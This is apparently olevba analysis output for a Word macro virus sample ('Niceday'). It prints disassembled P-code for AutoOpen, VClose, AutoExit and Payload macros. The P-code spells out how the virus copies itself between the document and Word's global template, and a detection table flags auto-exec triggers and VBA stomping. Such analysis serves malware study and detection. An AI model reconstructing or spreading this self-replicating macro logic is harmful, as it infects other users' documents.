olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Niceday.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Niceday.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Niceday.o
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Payload - 914 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Rem 0x0020 " That's enough to prove my point"
' Line #3:
' 	EndSub 
' Macros/VBA/AutoExit - 1711 bytes
' Line #0:
' Line #1:
' 	Rem 0x0018 " Concept3.AutoExit.Macro"
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	Dim 
' 	VarDefn message1
' Line #4:
' 	Dim 
' 	VarDefn daynumber
' Line #5:
' 	Dim 
' 	VarDefn monthnumber
' Line #6:
' 	LitStr 0x0032 "Terima Kasih... Sila tekan butang OK untuk keluar!"
' 	St message1$ 
' Line #7:
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	St daynumber 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	St monthnumber 
' Line #10:
' Line #11:
' 	Ld daynumber 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld monthnumber 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld message1$ 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld message1$ 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' 	EndIf 
' Line #12:
' Line #13:
' 	EndSub 
' Macros/VBA/AutoOpen - 1917 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn vZap
' Line #3:
' 	Dim 
' 	VarDefn vMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #5:
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St vZap$ 
' Line #7:
' Line #8:
' 	Ld vZap$ 
' 	LitStr 0x0008 ":Payload"
' 	Add 
' 	St vMacro$ 
' Line #9:
' 	Ld vMacro$ 
' 	LitStr 0x000E "Global:PayLoad"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #10:
' Line #11:
' 	Ld vZap$ 
' 	LitStr 0x0009 ":AutoExit"
' 	Add 
' 	St vMacro$ 
' Line #12:
' 	Ld vMacro$ 
' 	LitStr 0x000F "Global:AutoExit"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' Line #14:
' 	Ld vZap$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St vMacro$ 
' Line #15:
' 	Ld vMacro$ 
' 	LitStr 0x000C "Global:VOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' Line #17:
' 	Ld vZap$ 
' 	LitStr 0x0007 ":VClose"
' 	Add 
' 	St vMacro$ 
' Line #18:
' 	Ld vMacro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' Line #20:
' 	Label Abort 
' Line #21:
' 	EndSub 
' Macros/VBA/VClose - 1701 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn vZap
' Line #3:
' 	Dim 
' 	VarDefn vMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #5:
' Line #6:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St vZap$ 
' Line #9:
' Line #10:
' 	Ld vZap$ 
' 	LitStr 0x0008 ":Payload"
' 	Add 
' 	St vMacro$ 
' Line #11:
' 	LitStr 0x000E "Global:PayLoad"
' 	Ld vMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' Line #13:
' 	Ld vZap$ 
' 	LitStr 0x0009 ":AutoExit"
' 	Add 
' 	St vMacro$ 
' Line #14:
' 	LitStr 0x000F "Global:AutoExit"
' 	Ld vMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' Line #16:
' 	Ld vZap$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St vMacro$ 
' Line #17:
' 	LitStr 0x000C "Global:VOpen"
' 	Ld vMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' Line #19:
' 	Ld vZap$ 
' 	LitStr 0x0007 ":VClose"
' 	Add 
' 	St vMacro$ 
' Line #20:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld vMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' Line #22:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #23:
' Line #24:
' 	Label Abort 
' Line #25:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

